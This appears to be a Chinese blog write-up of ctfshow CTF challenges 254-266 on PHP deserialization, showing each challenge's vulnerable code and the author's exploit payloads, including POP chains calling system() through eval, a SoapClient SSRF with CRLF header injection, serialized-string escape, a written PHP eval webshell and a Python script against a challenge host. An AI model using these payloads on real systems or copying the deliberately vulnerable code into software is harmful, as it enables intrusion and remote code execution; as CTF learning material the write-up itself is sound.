## [¶](https://www.wlhhlc.top/posts/33757/#前言)前言

重新开一篇啦，上一篇已经太长了，继续学习了…

## [¶](https://www.wlhhlc.top/posts/33757/#反序列化-254-278)反序列化(254-278)

### [¶](https://www.wlhhlc.top/posts/33757/#常见的魔术方法)常见的魔术方法

```
php
__construct()，类的构造函数
 
__destruct()，类的析构函数
 
__call()，在对象中调用一个不可访问方法时调用
 
__callStatic()，用静态方式中调用一个不可访问方法时调用
 
__get()，获得一个类的成员变量时调用
 
__set()，设置一个类的成员变量时调用
 
__isset()，当对不可访问属性调用isset()或empty()时调用
 
__unset()，当对不可访问属性调用unset()时被调用。
 
__sleep()，执行serialize()时，先会调用这个函数
 
__wakeup()，执行unserialize()时，先会调用这个函数
 
__toString()，类被当成字符串时的回应方法
 
__invoke()，调用函数的方式调用一个对象时的回应方法
 
__set_state()，调用var_export()导出类时，此静态方法会被调用。
 
__clone()，当对象复制完成时调用
 
__autoload()，尝试加载未定义的类
 
__debugInfo()，打印所需调试信息
```

注意点：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同

```
Code

public          被序列化的时候属性名 不会更改
protected       被序列化的时候属性名 会变成  %00*%00属性名
private         被序列化的时候属性名 会变成  %00类名%00属性名
```

### [¶](https://www.wlhhlc.top/posts/33757/#web254)web254

这题倒是和反序列化没什么关系，主要是看类的调用吧

```
php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 
```

传入两个get参数，分别是`username`和`password`，然后用new实例化`ctfShowUser`这个类，接着调用`login`这个方法，可以看到如果用户名和密码都正确的话就把true赋值给`isVip`，然后就是进入`checkVip`和`vipOneKeyGetFlag`方法获得flag。所以payload为

```
Code
?username=xxxxxx&password=xxxxxx
```

### [¶](https://www.wlhhlc.top/posts/33757/#web255)web255

```
php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

这题和上一题的区别是在类里面没有对`isVip`属性进行赋值`true`，所以我们需要想办法把`isVip`赋值成`true`才能获得flag；观察可以看到会对`cookie`中的`user`进行反序列化，所以这里是一个漏洞点，我们可以往这里传入序列化的字符串，通过反序列化把`isVip`赋值成true。
本地新建一个php文件，对类`ctfShowUser`赋值，然后进行序列化

```
php
<?php
    class ctfShowUser{
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
    }

    $a = new ctfShowUser();
    echo serialize($a);
?>
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/3NX_IIN%60F%60%24RNGXZW6SVZZT.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/3NX_IIN`F`%24RNGXZW6SVZZT.png)
运行后得到

```
Code
O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;}
```

记得用bp的话要进行一个url编码
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/_G%7BLZ%5D3IX1XV0C2O%28ZJ%24K~0.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/_G{LZ]3IX1XV0C2O(ZJ%24K~0.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web256)web256

```
php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

和上一题差不多，只是在获取flag的时候多了一层判断，即用户名和密码不一样，我们自己序列化的时候改一下账号和密码就好了

```
php
<?php
    class ctfShowUser{
        public $username='dotast';
        public $password='123456';
        public $isVip=true;
    }

    $a = new ctfShowUser();
    echo serialize($a);
?>
```

运行后得到

```
Code
O:11:"ctfShowUser":3:{s:8:"username";s:6:"dotast";s:8:"password";s:6:"123456";s:5:"isVip";b:1;}
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web256/31%60GRJOVOZG%5DK%40%60%60G%29IE7%29I.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web256/31`GRJOVOZG]K@``G)IE7)I.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web257)web257

```
php
 <?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

这次多了几个类，还是先观察`ctfShowUser`类，反序列化的时候会先实例化`info`这个类，接着再销毁的时候调用类中的`getInfo`方法；很显然调用的是类`info`中的`getInfo`方法，而我们需要调用类`backDoor`中的`getInfo`方法，因为其中含有`eval`可以命令执行。所以我们把本来调用的类改成`backDoor`，payload如下

```
php
<?php
    class ctfShowUser{
        private $class='backDoor';
        public function __construct(){
            $this->class=new backDoor();
        }
    }
    class backDoor{
        private $code='system("cat flag.php");';
    }

    $a = new ctfShowUser();
    echo urlencode(serialize($a));
?>
```

运行后得到

```
Code
O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web257/7%5DK%407ZP_%7BJB5GDQQD19AH82.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web257/7]K@7ZP_{JB5GDQQD19AH82.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web258)web258

```
php
 <?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

在上一题的基础上对输入做了正则过滤
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/6%28U8F%258M4_MSU44UJ%29%258Q0Y.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/6(U8F%8M4_MSU44UJ)%8Q0Y.png)
在数字前面加一个`+`号即可绕过正则

```
php
<?php
    class ctfShowUser{
        public $class='backDoor';
        public function __construct(){
            $this->class=new backDoor();
        }
    }
    class backDoor{
        public $code='system("cat flag.php");';
    }

    $a = new ctfShowUser();
    echo serialize($a)."\n";
    echo urlencode(serialize($a));

?>
```

运行后得到

```
Code
O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
```

加上`+`号，需要url编码

```
Code
O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/YPDGH3%40LKV3DU6MW%405RQ%7BTK.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/YPDGH3@LKV3DU6MW@5RQ{TK.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web259)web259

这题知识点也在我盲区之外，跟着合天的一篇文章学习：https://zhuanlan.zhihu.com/p/80918004 ，接下来我的很长，你忍一下~

**SoapClient**

> SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP是一
>
> 种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果
>
> 去调用了一个不存在的函数，会去调用 __call 方法

调用不存在的方法，使`SoapClient`类去调用`__call`方法

```
php
<?php
    $a = new SoapClient(null,array('uri'=>'aaa', 'location'=>'http://127.0.0.1:5555/path'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/0.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/0.png)
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/2.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/2.png)

**CRLF漏洞**

> CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS

在上面的图中，我们可以看到，`SOAPAction`是可控的点，我们注入两个`\r\n`来控制POST请求头

```
php
<?php
    $a = new SoapClient(null,array('uri'=>"aaa\r\n\r\nbbb\r\n", 'location'=>'http://127.0.0.1:5555/path'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

执行后可以看到成功控制了请求头

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165019106.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165019106.png)
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165048219.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165048219.png)但还有一个问题需要解决，POST数据指定请求头为`Content-Type:application/x-www-form-urlencoded`，我们需要控制`Content-Type`，但从上图中可以发现它位于`SOAPAtion`上方。
继续往上，可以发现`User-Agent`位于`Content-Type`上方，这个位置也可以进行注入，所以我们再`User-Agent`进行注入

```
php
<?php
	$post_string = "dotast=cool";
    $a = new SoapClient(null,array('location'=>'http://127.0.0.1:5555/path', 'user_agent'=>"dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/%40%40N4MY7%28%29%24VPJK%5BT%287OJ%40%24C.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/@@N4MY7()%24VPJK[T(7OJ@%24C.png)
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/651651651.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/651651651.png)
如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到题目本身
**flag.php**

```
php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

**index.php**

```
php
<?php
highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

相关参数都给足了，利用ssrf访问flag.php，然后构造post数据`token=ctfshow`还有xff请求头，paylaod如下

```
php
<?php
	$post_string = "token=ctfshow";
    $a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'user_agent'=>"dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n"."X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
    $b = serialize($a);
    echo urlencode($b);
```

这里`X-Forwarded-For`里面需要两个`127.0.0.1`的原因是docker环境cloudfare代理所导致，具体可参考这篇文章：

```
Code
https://support.cloudflare.com/hc/zh-cn/articles/200170986-Cloudflare-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-HTTP-%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4-
```

运行php
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/3P2RS_%28_OD3MNXDOSSRMAQ5.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/3P2RS_(_OD3MNXDOSSRMAQ5.png)get参数`vip`传入
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/PQDH%7DSL4M%40T%28U%5D%5DYSS%5D%5BDVI.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/PQDH}SL4M@T(U]]YSS][DVI.png)再访问flag.txt就有了
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/H%7DCHET11SKQYTIBD59X9%25UL.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/H}CHET11SKQYTIBD59X9%UL.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web260)web260

水题吧这是…

```
php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');
if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

直接传`?ctfshow=/ctfshow_i_love_36D/`就出flag

### [¶](https://www.wlhhlc.top/posts/33757/#web261)web261

```
php
 <?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}
unserialize($_GET['vip']);
```

观察代码，可以发现`__invoke`有命令执行，`__destruct`有文件写入；注意到有一个`__unserialize`魔术方法
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/N6BRWVT.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/N6BRWVT.png)
显然

> 如果 `__unserialize()` 和 `__wakeup()`两个魔术方法都定义在用一个对象中， 则只有 `__unserialize()` 方法会生效，`__wakeup()` 方法会被忽略。

所以我们只用观察`__unserialize`魔术方法，可以发现将传进的`username`和`password`会拼接到`code`中，而在`__destruct`中会判断`code`，接着写入文件
很明显这里是一个弱比较，直接构造payload

```
php
<?php
class ctfshowvip{
    //0x36d等于十进制877
    public $username = "877.php";
    public $password = '<?php @eval($_POST[dotast]);?>';
}
$a = new ctfshowvip();
echo urlencode(serialize($a));
```

执行后直接传入

```
Code
?vip=O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bdotast%5D%29%3B%3F%3E%22%3B%7D
```

写入webshell之后，去获取flag[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/E.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/E.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web262)web262

本题考的是一个简单的反序列化字符串逃逸，在看题之前，我们简单了解一下知识点，我们先看一段代码

```
php
<?php
class test{
    public  $username = "user";
    public $password = "user";
}
$a = new test();
$b = serialize($a);
var_dump($b);
```

运行后

```
php
string(67) "O:4:"test":2:{s:8:"username";s:4:"user";s:8:"password";s:4:"user";}"
```

如果我们构造user中的内容，即

```
php
$c = 'O:4:"test":2:{s:8:"username";s:4:"user";s:8:"password";s:4:"test";}user";}';
var_dump(unserialize($c));
```

[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web262/%24F7%60OR_D%7D%5DFLNKJF1%40%29U__W.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web262/%24F7`OR_D}]FLNKJF1@)U__W.png)
很显然，`user`被替换成了`test`，而后面的`user";}`则被忽略

再回到题目本身

```
php
 <?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];
if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}
highlight_file(__FILE__);
```

注释提示了`message.php`，我们再访问一下`message.php`

```
php
 <?php
highlight_file(__FILE__);
include('flag.php');
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

梳理一下代码逻辑，有一个正则会把传入的序列化内容中的`fuck`替换成`loveU`，也就是长度从4变成了5，我们可以操作的内容就多了一位，并且只要`message`类中的`token`的值为`admin`，就会输出flag，所以我们的payload需要如下形式

```
Code
";s:5:"token";s:5:"admin";}
```

构造的payload长度一共27位，所以我们需要输入27个`fuck`来获得额外的27个长度，以达到填充我们的字符的目的，最后payload如下

```
Code
?f=123&m=123&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

然后再访问`message.php`就可以输入flag

### [¶](https://www.wlhhlc.top/posts/33757/#web263)web263

访问`www.zip`下载得到源码，观察关键代码
index.php

```
php
<?php
	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
?>
```

inc.php

```
php
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```

显然，`cookie`中的`limit`进行base64解码之后传入session中，之后调用`inc`中的`User`类，并且其中这个`User`类中存在文件写入函数，所以写入一句话即可，payload如下

```
php
<?php
class User{
    public $username = 'dotast.php';
    public $password = '<?php system("tac flag.php");?>';
    public $status='dotast';

}
$a=new User();
echo base64_encode('|'.serialize($a));
```

运行后得到

```
Code
fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9
```

然后存进cookie中，带着cookie去访问`index.php`，接着访问`inc/inc.php`，然后就会生成文件`log-dotast.php`，直接写一个脚本

```
python
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/9/2 16:01
# blog: www.wlhhlc.top
import requests
url = "http://06573677-b16d-4788-a60d-2f244b945cd1.challenge.ctf.show:8080/"
cookies = {"PHPSESSID": "g3us2rlfsn3q3fkahcja154gs8", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}
res1 = requests.get(url + "index.php", cookies=cookies)

res2 = requests.get(url + "inc/inc.php", cookies=cookies)

res3 = requests.get(url + "log-dotast.php", cookies=cookies)
print(res3.text)
```

运行后即可获取flag

### [¶](https://www.wlhhlc.top/posts/33757/#web264)web264

和web262差不多，用之前的payload打，不过访问`message.php`的时候需要`coookie`中的`msg`有值，因为`message.php`有如下判断

```
php
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

payload

```
Code
?f=123&m=123&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

访问`message.php`
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web264/0D%406H0W%7BX%7DPI%7DW%29SU4CSY_U.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web264/0D@6H0W{X}PI}W)SU4CSY_U.png)

### [¶](https://www.wlhhlc.top/posts/33757/#web265)web265

```
php
<?php
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

看了一下代码逻辑，很显然，`$ctfshow`接收传进来的反序列化内容，然后把类中的token赋值为随机数。然后调用`login`方法，只有`token===password`才会输出flag；而我们怎么才能定义`password`的内容等于我们未知的随机数呢？我们可以采用php变量引用的方式

```
php
<?php
$a =&$b;
?>
```

> 注意：$a和$b是指向同一个地方，而不是$a指向了$b，亦或$b指向$a

所以payload为

```
php
<?php
class ctfshowAdmin{
    public $token = "dotast";
    public $password = "dotast";

    public function login(){
        return $this->token===$this->password;
    }
}

$a = new ctfshowAdmin();
$a ->token=&$a ->password;
echo urlencode(serialize($a));
```

### [¶](https://www.wlhhlc.top/posts/33757/#web266)web266

```
php
 <?php
highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

这题的话只要绕一个正则就行，绕过了自然在结束的时候触发`__destruct`魔术方法输出flag。有的同学问这里怎么传参，还不知道的同学该去复习一下文件包含专题啦。

```
php
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function login(){
        return $this->username===$this->password;
    }
}

$a = serialize(new ctfshow());
echo $a;
```

运行后得到

```
Code
O:7:"ctfshow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
```

`ctfshow`随便一个字母改成大写，绕过正则
[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web266/Y7FN7LODNQ9CJ%5DE%7DQO7_P%7DC.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web266/Y7FN7LODNQ9CJ]E}QO7_P}C.png)